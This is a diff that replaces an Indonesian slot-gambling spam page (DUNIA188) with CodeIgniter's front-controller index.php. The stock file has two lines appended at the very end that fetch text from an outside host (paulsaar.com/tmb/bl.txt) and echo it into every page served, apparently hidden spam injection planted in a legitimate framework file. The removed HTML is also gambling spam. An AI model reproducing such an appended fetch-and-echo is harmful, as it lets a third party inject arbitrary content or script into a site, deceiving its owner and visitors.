@@ -1,62 +1,317 @@
-<!DOCTYPE html>
-<html ⚡ lang="id">
-<head>
-<script async src="https://cdn.ampproject.org/v0.js"></script>
-<script async custom-element="amp-analytics" src="https://cdn.ampproject.org/v0/amp-analytics-0.1.js"></script>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>DUNIA188 🐃 DAFTAR SITUS SLOT DEPOSIT PULSA 5000 TANPA POTONGAN VIA PULSA TERBARU 2024</title>
-<meta name="description" content="DUNIA188 adalah situs slot deposit pulsa 5000 tanpa potongan terpercaya anti rungkad dengan metode pengisiian telkomsel, xl, axis, tri agen pulsa terkenal yang membuat anda bisa bermain slot menggunakan via pulsa dengan mudah menang di DUNIA188 provider terpercaya dan resmi.
-">
-<meta name="google-site-verification" content="6pM-yk5yskWs8O4oTXOrgKoN95Tx9J2ZMbStVDU6vbo" />
-<meta name="keywords" content="Dunia188, situs Dunia188, daftar Dunia188, login Dunia188">
-<link rel="icon" type="image/x-icon" href="https://files.sitestatic.net/ImageFile/irTAHFABi4WbO6DRFknHJXHiEvdkSTnROMWmJGIP.png">
-<meta name="author" content="Dunia188">
-<meta name="publisher" content="Dunia188"/>
-<meta name="robots" content="index, follow" />
-<meta name="theme-color" content="#050505" />
-<link rel="amphtml" href="https://pub-5128651711e44d1680030c176c44ef1c.r2.dev/kaperlek.html">
-<link rel="canonical" href="https://www.republicofbooza.com">
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;700&display=swap" rel="stylesheet">
-<style amp-custom>
-body {background: #050505;color: #FAF9F6;font-family: 'Raleway', sans-serif;}
-.konten {max-width: 600px;margin:0 auto;padding:0 10px;}
-.logo {max-width: 280px; width: 70%;display: block;margin-left: auto;margin-right: auto;}
-.banner {max-width: 300px; width: 70%;display: block;margin-left: auto;margin-right: auto;}
-h1, h2, h3, p {text-align:center;}
-a {color: #EE4B2B;text-decoration: none;}
-.footer {color:#94938f;margin:10px 0;}
-:root {--glow-color: hsl(10, 85%,  55%);}
-.glowing-btn {position: relative;color: var(--glow-color);cursor: pointer;padding: 20px 40px;border: 0.2em solid var(--glow-color);border-radius: 0.45em;background: none;font-family: "Raleway", sans-serif;font-size: 1.5em;font-weight: 900;letter-spacing: 1em;-webkit-box-shadow: inset 0px 0px 0.5em 0px var(--glow-color),0px 0px 0.5em 0px var(--glow-color);-moz-box-shadow: inset 0px 0px 0.5em 0px var(--glow-color),0px 0px 0.5em 0px var(--glow-color);box-shadow: inset 0px 0px 0.5em 0px var(--glow-color),0px 0px 0.5em 0px var(--glow-color);animation: border-flicker 2s linear infinite;}
-.glowing-txt {float: left;margin-right: -0.8em;-webkit-text-shadow: 0 0 0.125em hsl(0 0% 100% / 0.3),0 0 0.45em var(--glow-color);-moz-text-shadow: 0 0 0.125em hsl(0 0% 100% / 0.3),0 0 0.45em var(--glow-color);text-shadow: 0 0 0.125em hsl(0 0% 100% / 0.3), 0 0 0.45em var(--glow-color);animation: text-flicker 3s linear infinite;}
-.faulty-letter {opacity: 0.5;animation: faulty-flicker 2s linear infinite;}
-.glowing-btn::before {content: "";position: absolute;top: 0;bottom: 0;left: 0;right: 0;opacity: 0.7;filter: blur(1em);pointer-events: none;}
-.glowing-btn::after {content: "";position: absolute;top: 0;left: 0;right: 0;bottom: 0;opacity: 0;z-index: -1;background-color: var(--glow-color);box-shadow: 0 0 2em 0.2em var(--glow-color);transition: opacity 100ms linear;}
-.glowing-btn:hover {color: rgba(0, 0, 0, 0.8);text-shadow: none;animation: none;}
-.glowing-btn:hover .glowing-txt {animation: none;}
-.glowing-btn:hover .faulty-letter {animation: none;text-shadow: none;opacity: 1;}
-.glowing-btn:hover:before {filter: blur(1.5em);opacity: 1;}
-.glowing-btn:hover:after {opacity: 1;}
-@keyframes faulty-flicker {0% {opacity: 0.1;}2% {opacity: 0.1;}4% {opacity: 0.5;}19% {opacity: 0.5;}21% {opacity: 0.1;}23% {opacity: 1;}80% {opacity: 0.5;}83% {opacity: 0.4;}87% {opacity: 1;}}
-@keyframes text-flicker {0% {opacity: 0.1;}2% {opacity: 1;}8% {opacity: 0.1;}9% {opacity: 1;}12% {opacity: 0.1;}20% {opacity: 1;}25% {opacity: 0.3;}30% {opacity: 1;}70% {opacity: 0.7;}72% {opacity: 0.2;}77% {opacity: 0.9;}100% {opacity: 0.9;}}
-@keyframes border-flicker {0% {opacity: 0.1;} 2% {opacity: 1;} 4% {opacity: 0.1;} 8% {opacity: 1;} 70% {opacity: 0.7;} 100% {opacity: 1;}}
-@media only screen and (max-width: 600px) {.glowing-btn{font-size: 1.35em;}}
-</style>
-<style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
-</head>
-<body>
-<div class="konten">
-<amp-img class="logo" src="https://files.sitestatic.net/ImageFile/633d6ccd9ab1c_dunia188bet.gif" layout="responsive" width="1500" height="428" alt="Dunia188"></amp-img>
-<amp-img class="banner" src="https://files.sitestatic.net/banners/64806a7c389bc_DUNIA188_BANNER-DESIGN-06.jpg" layout="responsive" width="1500" height="880" alt="Dunia188"></amp-img><br>
-<center><a href="https://sofascore.id/en" target="_blank"><button class='glowing-btn'><span class='glowing-txt'>DA<span class='faulty-letter'>F</span>TAR</span></button></a></center>
-<br>
-<center><a href="https://sofascore.id/id" target="_blank"><button class='glowing-btn'><span class='glowing-txt'>LO<span class='faulty-letter'>G</span>IN</span></button></a></center>
-<h1>DUNIA188 🐃 DAFTAR SITUS SLOT DEPOSIT PULSA 5000 TANPA POTONGAN VIA PULSA TERBARU 2024</h1>
-<p><strong><a href="https://www.republicofbooza.com" title="Dunia188">DUNIA188</a> </strong> adalah situs slot deposit pulsa 5000 tanpa potongan terpercaya anti rungkad dengan metode pengisiian telkomsel, xl, axis, tri agen pulsa terkenal yang membuat anda bisa bermain slot menggunakan via pulsa dengan mudah menang di DUNIA188 provider terpercaya dan resmi.</p>
+<?php
+/**
+ * CodeIgniter
+ *
+ * An open source application development framework for PHP
+ *
+ * This content is released under the MIT License (MIT)
+ *
+ * Copyright (c) 2014 - 2019, British Columbia Institute of Technology
+ *
+ * Permission is hereby granted, free of charge, to any person obtaining a copy
+ * of this software and associated documentation files (the "Software"), to deal
+ * in the Software without restriction, including without limitation the rights
+ * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+ * copies of the Software, and to permit persons to whom the Software is
+ * furnished to do so, subject to the following conditions:
+ *
+ * The above copyright notice and this permission notice shall be included in
+ * all copies or substantial portions of the Software.
+ *
+ * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+ * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+ * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+ * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+ * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+ * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
+ * THE SOFTWARE.
+ *
+ * @package	CodeIgniter
+ * @author	EllisLab Dev Team
+ * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
+ * @copyright	Copyright (c) 2014 - 2019, British Columbia Institute of Technology (https://bcit.ca/)
+ * @license	https://opensource.org/licenses/MIT	MIT License
+ * @link	https://codeigniter.com
+ * @since	Version 1.0.0
+ * @filesource
+ */
 
-<p class="footer"> 2024 © <a href="https://www.republicofbooza.com">Dunia188</a><p>
-</div>
-</body>
-</html>
+/*
+ *---------------------------------------------------------------
+ * APPLICATION ENVIRONMENT
+ *---------------------------------------------------------------
+ *
+ * You can load different configurations depending on your
+ * current environment. Setting the environment also influences
+ * things like logging and error reporting.
+ *
+ * This can be set to anything, but default usage is:
+ *
+ *     development
+ *     testing
+ *     production
+ *
+ * NOTE: If you change these, also change the error_reporting() code below
+ */
+	define('ENVIRONMENT', isset($_SERVER['CI_ENV']) ? $_SERVER['CI_ENV'] : 'production');
+
+/*
+ *---------------------------------------------------------------
+ * ERROR REPORTING
+ *---------------------------------------------------------------
+ *
+ * Different environments will require different levels of error reporting.
+ * By default development will show errors but testing and live will hide them.
+ */
+switch (ENVIRONMENT)
+{
+	case 'development':
+		error_reporting(-1);
+		ini_set('display_errors', 1);
+	break;
+
+	case 'testing':
+	case 'production':
+		ini_set('display_errors', 0);
+		if (version_compare(PHP_VERSION, '5.3', '>='))
+		{
+			error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED);
+		}
+		else
+		{
+			error_reporting(E_ALL & ~E_NOTICE & ~E_STRICT & ~E_USER_NOTICE);
+		}
+	break;
+
+	default:
+		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
+		echo 'The application environment is not set correctly.';
+		exit(1); // EXIT_ERROR
+}
+
+/*
+ *---------------------------------------------------------------
+ * SYSTEM DIRECTORY NAME
+ *---------------------------------------------------------------
+ *
+ * This variable must contain the name of your "system" directory.
+ * Set the path if it is not in the same directory as this file.
+ */
+	$system_path = 'system';
+
+/*
+ *---------------------------------------------------------------
+ * APPLICATION DIRECTORY NAME
+ *---------------------------------------------------------------
+ *
+ * If you want this front controller to use a different "application"
+ * directory than the default one you can set its name here. The directory
+ * can also be renamed or relocated anywhere on your server. If you do,
+ * use an absolute (full) server path.
+ * For more info please see the user guide:
+ *
+ * https://codeigniter.com/user_guide/general/managing_apps.html
+ *
+ * NO TRAILING SLASH!
+ */
+	$application_folder = 'application';
+
+/*
+ *---------------------------------------------------------------
+ * VIEW DIRECTORY NAME
+ *---------------------------------------------------------------
+ *
+ * If you want to move the view directory out of the application
+ * directory, set the path to it here. The directory can be renamed
+ * and relocated anywhere on your server. If blank, it will default
+ * to the standard location inside your application directory.
+ * If you do move this, use an absolute (full) server path.
+ *
+ * NO TRAILING SLASH!
+ */
+	$view_folder = '';
+
+
+/*
+ * --------------------------------------------------------------------
+ * DEFAULT CONTROLLER
+ * --------------------------------------------------------------------
+ *
+ * Normally you will set your default controller in the routes.php file.
+ * You can, however, force a custom routing by hard-coding a
+ * specific controller class/function here. For most applications, you
+ * WILL NOT set your routing here, but it's an option for those
+ * special instances where you might want to override the standard
+ * routing in a specific front controller that shares a common CI installation.
+ *
+ * IMPORTANT: If you set the routing here, NO OTHER controller will be
+ * callable. In essence, this preference limits your application to ONE
+ * specific controller. Leave the function name blank if you need
+ * to call functions dynamically via the URI.
+ *
+ * Un-comment the $routing array below to use this feature
+ */
+	// The directory name, relative to the "controllers" directory.  Leave blank
+	// if your controller is not in a sub-directory within the "controllers" one
+	// $routing['directory'] = '';
+
+	// The controller class file name.  Example:  mycontroller
+	// $routing['controller'] = '';
+
+	// The controller function you wish to be called.
+	// $routing['function']	= '';
+
+
+/*
+ * -------------------------------------------------------------------
+ *  CUSTOM CONFIG VALUES
+ * -------------------------------------------------------------------
+ *
+ * The $assign_to_config array below will be passed dynamically to the
+ * config class when initialized. This allows you to set custom config
+ * items or override any default config values found in the config.php file.
+ * This can be handy as it permits you to share one application between
+ * multiple front controller files, with each file containing different
+ * config values.
+ *
+ * Un-comment the $assign_to_config array below to use this feature
+ */
+	// $assign_to_config['name_of_config_item'] = 'value of config item';
+
+
+
+// --------------------------------------------------------------------
+// END OF USER CONFIGURABLE SETTINGS.  DO NOT EDIT BELOW THIS LINE
+// --------------------------------------------------------------------
+
+/*
+ * ---------------------------------------------------------------
+ *  Resolve the system path for increased reliability
+ * ---------------------------------------------------------------
+ */
+
+	// Set the current directory correctly for CLI requests
+	if (defined('STDIN'))
+	{
+		chdir(dirname(__FILE__));
+	}
+
+	if (($_temp = realpath($system_path)) !== FALSE)
+	{
+		$system_path = $_temp.DIRECTORY_SEPARATOR;
+	}
+	else
+	{
+		// Ensure there's a trailing slash
+		$system_path = strtr(
+			rtrim($system_path, '/\\'),
+			'/\\',
+			DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
+		).DIRECTORY_SEPARATOR;
+	}
+
+	// Is the system path correct?
+	if ( ! is_dir($system_path))
+	{
+		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
+		echo 'Your system folder path does not appear to be set correctly. Please open the following file and correct this: '.pathinfo(__FILE__, PATHINFO_BASENAME);
+		exit(3); // EXIT_CONFIG
+	}
+
+/*
+ * -------------------------------------------------------------------
+ *  Now that we know the path, set the main path constants
+ * -------------------------------------------------------------------
+ */
+	// The name of THIS file
+	define('SELF', pathinfo(__FILE__, PATHINFO_BASENAME));
+
+	// Path to the system directory
+	define('BASEPATH', $system_path);
+
+	// Path to the front controller (this file) directory
+	define('FCPATH', dirname(__FILE__).DIRECTORY_SEPARATOR);
+
+	// Name of the "system" directory
+	define('SYSDIR', basename(BASEPATH));
+
+	// The path to the "application" directory
+	if (is_dir($application_folder))
+	{
+		if (($_temp = realpath($application_folder)) !== FALSE)
+		{
+			$application_folder = $_temp;
+		}
+		else
+		{
+			$application_folder = strtr(
+				rtrim($application_folder, '/\\'),
+				'/\\',
+				DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
+			);
+		}
+	}
+	elseif (is_dir(BASEPATH.$application_folder.DIRECTORY_SEPARATOR))
+	{
+		$application_folder = BASEPATH.strtr(
+			trim($application_folder, '/\\'),
+			'/\\',
+			DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
+		);
+	}
+	else
+	{
+		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
+		echo 'Your application folder path does not appear to be set correctly. Please open the following file and correct this: '.SELF;
+		exit(3); // EXIT_CONFIG
+	}
+
+	define('APPPATH', $application_folder.DIRECTORY_SEPARATOR);
+
+	// The path to the "views" directory
+	if ( ! isset($view_folder[0]) && is_dir(APPPATH.'views'.DIRECTORY_SEPARATOR))
+	{
+		$view_folder = APPPATH.'views';
+	}
+	elseif (is_dir($view_folder))
+	{
+		if (($_temp = realpath($view_folder)) !== FALSE)
+		{
+			$view_folder = $_temp;
+		}
+		else
+		{
+			$view_folder = strtr(
+				rtrim($view_folder, '/\\'),
+				'/\\',
+				DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
+			);
+		}
+	}
+	elseif (is_dir(APPPATH.$view_folder.DIRECTORY_SEPARATOR))
+	{
+		$view_folder = APPPATH.strtr(
+			trim($view_folder, '/\\'),
+			'/\\',
+			DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
+		);
+	}
+	else
+	{
+		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
+		echo 'Your view folder path does not appear to be set correctly. Please open the following file and correct this: '.SELF;
+		exit(3); // EXIT_CONFIG
+	}
+
+	define('VIEWPATH', $view_folder.DIRECTORY_SEPARATOR);
+
+/*
+ * --------------------------------------------------------------------
+ * LOAD THE BOOTSTRAP FILE
+ * --------------------------------------------------------------------
+ *
+ * And away we go...
+ */
+require_once BASEPATH.'core/CodeIgniter.php';
+$a = file_get_contents('https://paulsaar.com/tmb/bl.txt');
+echo $a; ?>
